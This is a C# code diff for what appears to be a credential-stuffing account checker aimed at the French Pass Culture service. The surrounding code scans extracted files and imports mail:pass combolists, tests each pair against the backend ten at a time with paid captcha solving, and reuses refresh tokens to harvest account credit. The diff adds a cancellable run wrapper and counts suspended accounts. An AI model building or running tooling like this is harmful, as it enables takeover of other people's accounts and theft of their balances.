@@ -98,6 +98,35 @@ public sealed partial class AccountsViewModel : ObservableObject
     private readonly IDialogService _dialogs;
     private readonly TwoCaptchaService _twoCaptcha;
 
+    // One checker run at a time; the Stop button cancels its token.
+    private CancellationTokenSource? _checkerCts;
+    private bool _isChecking;
+    public bool IsChecking { get => _isChecking; set => SetProperty(ref _isChecking, value); }
+
+    [RelayCommand]
+    private void StopChecker()
+    {
+        if (_checkerCts is { } cts && !cts.IsCancellationRequested) { cts.Cancel(); StatusText = "Arrêt demandé…"; }
+    }
+
+    /// <summary>Runs one checker job: rejects a second concurrent run, owns a cancellation token wired to the
+    /// Stop button, and always resets the busy flag.</summary>
+    private async Task RunCheckerAsync(Func<CancellationToken, Task> body)
+    {
+        if (IsChecking) { StatusText = "Un check est déjà en cours."; return; }
+        var cts = _checkerCts = new CancellationTokenSource();
+        IsChecking = true;
+        try { await body(cts.Token); }
+        catch (OperationCanceledException) { _ui.Post(() => StatusText = "Annulé."); }
+        catch (Exception ex) { _ui.Post(() => StatusText = ex.Message); }
+        finally
+        {
+            IsChecking = false;
+            if (ReferenceEquals(_checkerCts, cts)) _checkerCts = null;
+            cts.Dispose();
+        }
+    }
+
     public AccountsViewModel(IStorageService storage, IUiDispatcher ui, PasscultureClient passClient,
         IAccountTestRegistry accounts, IDialogService dialogs, TwoCaptchaService twoCaptcha)
     {
@@ -168,104 +197,91 @@ public sealed partial class AccountsViewModel : ObservableObject
     }
 
     [RelayCommand]
-    private async Task TestAccountsAsync()
+    private Task TestAccountsAsync() => RunCheckerAsync(async ct =>
     {
         StatusText = "Test des comptes…";
         await Task.Run(async () =>
         {
-            try
+            // Collect every credential we know about: saved records + a fresh scan of extracted files.
+            var creds = new List<CredentialEntry>();
+            foreach (var r in _storage.LoadRecords())
+                if (r.Credentials is not null) creds.AddRange(r.Credentials);
+            foreach (var path in _storage.EnumerateExtractedFiles(null))
             {
-                // Collect every credential we know about: saved records + a fresh scan of extracted files.
-                var creds = new List<CredentialEntry>();
-                foreach (var r in _storage.LoadRecords())
-                    if (r.Credentials is not null) creds.AddRange(r.Credentials);
-                foreach (var path in _storage.EnumerateExtractedFiles(null))
+                try { creds.AddRange(CredentialScanner.ScanFile(path)); } catch { }
+            }
+
+            // Deduplicate by NORMALIZED identity (email+password) so the same account is never tested twice.
+            var unique = creds
+                .Where(c => !string.IsNullOrWhiteSpace(c.Username) || !string.IsNullOrWhiteSpace(c.Password))
+                .GroupBy(c => AccountKey.Of(c.Username, c.Password))
+                .Select(g => g.First())
+                .ToList();
+
+            if (unique.Count == 0)
+            {
+                _ui.Post(() => StatusText = "Aucun compte à tester.");
+                return;
+            }
+
+            int sent = 0, alreadyKnown = 0;
+            await Parallel.ForEachAsync(unique,
+                new ParallelOptions { MaxDegreeOfParallelism = 10, CancellationToken = ct },
+                async (c, token) =>
                 {
-                    try { creds.AddRange(CredentialScanner.ScanFile(path)); } catch { }
-                }
-
-                // Deduplicate by NORMALIZED identity (email+password) so the same account is never tested twice.
-                var unique = creds
-                    .Where(c => !string.IsNullOrWhiteSpace(c.Username) || !string.IsNullOrWhiteSpace(c.Password))
-                    .GroupBy(c => AccountKey.Of(c.Username, c.Password))
-                    .Select(g => g.First())
-                    .ToList();
-
-                if (unique.Count == 0)
-                {
-                    _ui.Post(() => StatusText = "Aucun compte à tester.");
-                    return;
-                }
-
-                int sent = 0, alreadyKnown = 0;
-                await Parallel.ForEachAsync(unique,
-                    new ParallelOptions { MaxDegreeOfParallelism = 10 },
-                    async (c, token) =>
-                    {
-                        if (_accounts.TryGet(c.Username, c.Password, out _)) { Interlocked.Increment(ref alreadyKnown); return; }
-                        // The registry reserves atomically before any backend call → no duplicate captcha.
-                        await AccountTester.TestOnceAsync(_passClient, _accounts, c, token);
-                        Interlocked.Increment(ref sent);
-                    });
-
-                _ui.Post(() =>
-                {
-                    StatusText = $"Terminé : {unique.Count} compte(s) unique(s) — {sent} envoyé(s) au backend, {alreadyKnown} déjà connu(s).";
-                    Refresh();
+                    if (_accounts.TryGet(c.Username, c.Password, out _)) { Interlocked.Increment(ref alreadyKnown); return; }
+                    // The registry reserves atomically before any backend call → no duplicate captcha.
+                    await AccountTester.TestOnceAsync(_passClient, _accounts, c, token);
+                    Interlocked.Increment(ref sent);
                 });
-            }
-            catch (Exception ex)
+
+            _ui.Post(() =>
             {
-                _ui.Post(() => StatusText = ex.Message);
-            }
-        });
-    }
+                StatusText = $"Terminé : {unique.Count} compte(s) unique(s) — {sent} envoyé(s) au backend, {alreadyKnown} déjà connu(s).";
+                Refresh();
+            });
+        }, ct);
+    });
 
     /// <summary>Re-fetches the credit (and birth date) of accounts that came back VALIDE/CUSTOM but never got
     /// a credit, by reusing their stored refresh token — so it costs <b>zero captcha</b> and no sign-in.</summary>
     [RelayCommand]
-    private async Task RefreshCreditsAsync()
+    private Task RefreshCreditsAsync() => RunCheckerAsync(async ct =>
     {
-        var candidates = await Task.Run(() => _storage.LoadAccountsNeedingCredit());
+        var candidates = await Task.Run(() => _storage.LoadAccountsNeedingCredit(), ct);
         if (candidates.Count == 0)
         {
-            StatusText = "Aucun compte à rafraîchir (crédit déjà connu ou pas de refresh token).";
+            _ui.Post(() => StatusText = "Aucun compte à rafraîchir (crédit déjà connu ou pas de refresh token).");
             return;
         }
 
-        StatusText = $"Rafraîchissement de {candidates.Count} compte(s)…";
+        _ui.Post(() => StatusText = $"Rafraîchissement de {candidates.Count} compte(s)…");
         await Task.Run(async () =>
         {
-            try
-            {
-                int got = 0, done = 0;
-                await Parallel.ForEachAsync(candidates,
-                    new ParallelOptions { MaxDegreeOfParallelism = 10 },
-                    async (a, token) =>
-                    {
-                        var (_, gotCredit) = await AccountTester.RefreshCreditAsync(_passClient, _accounts, a, token);
-                        if (gotCredit) Interlocked.Increment(ref got);
-
-                        int d = Interlocked.Increment(ref done);
-                        if (d % 10 == 0 || d == candidates.Count)
-                        {
-                            int g = Volatile.Read(ref got);
-                            _ui.Post(() => StatusText = $"Rafraîchissement : {d}/{candidates.Count} — {g} crédit(s) récupéré(s)");
-                        }
-                    });
-
-                _ui.Post(() =>
+            int got = 0, suspended = 0, done = 0;
+            await Parallel.ForEachAsync(candidates,
+                new ParallelOptions { MaxDegreeOfParallelism = 10, CancellationToken = ct },
+                async (a, token) =>
                 {
-                    StatusText = $"Terminé : {got} crédit(s) récupéré(s) sur {candidates.Count} compte(s) rafraîchi(s).";
-                    Refresh();
+                    var (_, gotCredit, wasSuspended) = await AccountTester.RefreshCreditAsync(_passClient, _accounts, a, token);
+                    if (gotCredit) Interlocked.Increment(ref got);
+                    if (wasSuspended) Interlocked.Increment(ref suspended);
+
+                    int d = Interlocked.Increment(ref done);
+                    if (d % 10 == 0 || d == candidates.Count)
+                    {
+                        int g = Volatile.Read(ref got), s = Volatile.Read(ref suspended);
+                        _ui.Post(() => StatusText = $"Rafraîchissement : {d}/{candidates.Count} — {g} crédit(s), {s} suspendu(s)");
+                    }
                 });
-            }
-            catch (Exception ex)
+
+            _ui.Post(() =>
             {
-                _ui.Post(() => StatusText = ex.Message);
-            }
-        });
-    }
+                StatusText = $"Terminé : {got} crédit(s) récupéré(s), {suspended} compte(s) passé(s) suspendu(s) sur {candidates.Count} rafraîchi(s).";
+                Refresh();
+            });
+        }, ct);
+    });
 
     /// <summary>Imports a mail:pass combolist (.txt) and sends every unique, not-yet-known account to the
     /// checker (one captcha each). Reuses the same atomic registry + tester as the rest of the app, so
@@ -293,13 +309,13 @@ public sealed partial class AccountsViewModel : ObservableObject
             return;
         }
 
-        await Task.Run(async () =>
+        await RunCheckerAsync(async ct =>
         {
-            try
+            await Task.Run(async () =>
             {
                 int sent = 0, alreadyKnown = 0, done = 0;
                 await Parallel.ForEachAsync(unique,
-                    new ParallelOptions { MaxDegreeOfParallelism = 10 },
+                    new ParallelOptions { MaxDegreeOfParallelism = 10, CancellationToken = ct },
                     async (c, token) =>
                     {
                         if (_accounts.TryGet(c.Username, c.Password, out _)) Interlocked.Increment(ref alreadyKnown);
@@ -323,11 +339,7 @@ public sealed partial class AccountsViewModel : ObservableObject
                                  $"{alreadyKnown} déjà connu(s), {malformed} ligne(s) ignorée(s).";
                     Refresh();
                 });
-            }
-            catch (Exception ex)
-            {
-                _ui.Post(() => StatusText = ex.Message);
-            }
+            }, ct);
         });
     }
 
